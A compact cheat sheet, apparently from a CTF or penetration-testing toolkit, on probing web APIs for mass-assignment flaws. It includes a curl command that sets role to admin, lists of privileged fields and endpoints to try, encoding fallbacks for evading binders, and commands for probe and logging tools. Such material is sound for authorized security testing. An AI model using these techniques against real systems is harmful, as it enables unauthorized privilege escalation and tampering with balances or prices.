# Quick reference — mass assignment in 30 seconds

## The one-line test

```bash
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"role":"admin"}' && curl -b "$JAR" "$BASE/api/me"
```

`role:"admin"` on the read-back → stored → `GET /admin` → `200` = the
confirm.

## The endpoint priority

`PATCH /users/me` → `PUT /users/:id` → `POST /register` → `POST /orders`
→ `/import` → GraphQL mutation → `POST /admin/users`.

## The field priority

`role`, `is_admin`, `isAdmin`, `is_staff` → `verified`, `is_active`,
`approved` → `balance`, `credits` → `price`, `discount`, `total` →
`plan`, `tier` → `permissions`, `groups`, `roles`.

## The carrier fallback

`role` flat JSON → `role=admin` form → `{"profile":{"role":..}}` nested
→ `user[role]=admin` (Rails) → `role[]=admin` array → `Role` (.NET
case) → `role:true`/`1` (type) → `PATCH` → `PUT` → `?role=` query.

## The falsifier read

`400` → content-type dead, try form. `200`+drop → endpoint dead, try
nested/PATCH. Drop everywhere → binder-family dead, try GraphQL/admin.
Stored+`403` → inert, find the gate's real field. No privileged fields
→ class dead.

## The tool

```bash
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"
```

## The record

```bash
python3 tools/hooks.py post-probe <ch> \
  --request "PATCH /users/me role=admin" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat readback.txt)"
```

## The boundary

`author_id:9` access → `web-idor`. `__proto__` → `web-prototype-
pollution`. `$set` → `web-nosqli`. Step-skip → `web-logic-flaw`.
